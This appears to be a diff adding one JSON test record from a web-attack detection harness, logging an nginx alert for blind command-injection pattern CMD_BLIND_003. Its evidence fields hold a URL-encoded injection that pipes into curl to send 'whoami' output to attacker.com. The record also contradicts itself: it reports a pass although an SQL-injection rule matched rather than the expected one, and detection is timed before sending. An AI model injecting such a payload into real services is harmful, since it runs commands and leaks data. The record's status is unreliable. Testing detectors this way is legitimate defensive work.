@@ -1,0 +1,15 @@
+{
+  "pattern_id": "CMD_BLIND_003",
+  "test_id": "CMD_BLIND_003-1767071278638-o9far",
+  "category": "cmdinj",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 23000,
+  "evidence": "05:07:58.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BLIND_003-1767071278638-o9far pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1 method=GET",
+  "rule_name": "[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BLIND_003-1767071278638-o9far pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1 method=GET",
+  "expected_rule": "Command Injection via Pipe",
+  "rule_id": "",
+  "sent_at": 1767071301000,
+  "detected_at": 1767071278000,
+  "status": "passed"
+}
